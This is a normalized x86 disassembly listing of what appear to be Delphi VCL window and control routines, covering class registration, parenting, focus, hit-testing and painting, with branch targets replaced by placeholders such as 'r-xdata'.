mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44119c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40349c
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_43efc4
mov edx ebx
mov eax edi
call sub_441108
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_43efc4
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43efc4
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax edi
call sub_4448fc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_43efc4
mov eax edi
call sub_441cec
jmp r-xdata
mov edx ebx
mov eax edi
call sub_440dfc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441270
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_43efc4
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax esi
call sub_4448fc
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_4410e8
mov eax ebp
call sub_441b50
jmp r-xdata
mov edx ebx
mov eax esi
call sub_441154
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_43efc4
mov eax esi
call sub_440eb8
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e240
sub_4412ec
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_413de4
mov edx edi
mov eax ebp
call sub_413de4
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_441348
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_441328
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4412ec
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_441388
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_441348
add esp 0x10
retn
sub_4413b0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44141c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_43e454
test al al
je r-xdata
mov eax ebx
call sub_43e484
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_40349c
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_40349c
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_441484
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4415a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402cbc
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44141c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_4445f8
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031f0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042d8
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_40878c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4415a9
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_4415b0
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_441771
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43ab98
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_43ab98
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cac0
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cac0
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_40892c
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_444908
push 0x1
mov eax [ esi + 0x68 ]
call sub_41d414
mov ecx eax
mov edx 0x30
mov eax esi
call sub_43efc4
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_4445f8
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441778
lea eax [ ebp - 0xc0 ]
call sub_404074
retn
mov eax esi
mov si 0xffee
call sub_40349c
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_441780
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406b50
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_4417c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41806c
mov eax esi
call sub_417fbc
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_417fbc
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_418074
pop esi
pop ebx
retn
sub_4417f8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_4198b8
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_419844
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_419844
mov eax esi
call sub_4198c0
add esp 0x10
pop esi
pop ebx
retn
sub_441860
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_44184c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413de4
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413de4
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_441938
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43f2fc
mov eax [ ebp - 0x8 ]
push eax
push sub_4417c0
mov eax [ ebp - 0x8 ]
push eax
push sub_4417f8
push ebp
call sub_441860
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441994
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43dd6c
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_4088e0
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4088f4
mov ecx eax
mov edx edi
mov eax ebx
call sub_43dd7c
mov eax r-xdata
call sub_408900
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_43c820
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_4419ec
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_441a39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441a40
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cac0
sub_441a50
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_413e40
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_413de4
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_441a98
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_441328
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_441a50
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4412ec
call sub_43d44c
inc edi
dec esi
jne r-xdata
sub_441b34
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_441b50
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_413de4
call sub_441b50
inc edi
dec esi
jne r-xdata
sub_441bb0
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_40349c
mov ebx eax
mov eax edi
call sub_441b50
mov eax edi
call sub_441cec
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_441bf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_441cc6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_43efc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413de4
call sub_441bf0
inc esi
dec ebx
jne r-xdata
sub_441cec
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_441bf0
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_441d2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_441b50
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_441cec
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406b38
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43efc4
jmp r-xdata
sub_441db4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403740#9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_441dfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441e02
call sub_43c820
call sub_4212ec
retn
sub_441e2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412988
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406b20
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_43efc4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_441ee4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_413de4
call sub_441e2c
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_413de4
call sub_441e2c
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_441f78
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4445f8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406b0c
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_441ee4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b20
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_43efc4
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44200c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_43e580
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_43f090
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_441f78
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406b0c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_43d93c
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_441ee4
test eax eax
je r-xdata
mov eax ebx
call sub_455244
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43f090
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_4445f8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4445f8
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_43efc4
sub_442170
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43f224
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_43efc4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41cf40
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41dbe4
call sub_41cf40
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41dc20
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43d998
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_442278
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43ac84
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_43efc4
mov [ esi + 0xc ] eax
mov bl 0x1
sub_4422ac
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_4423cc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442404
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
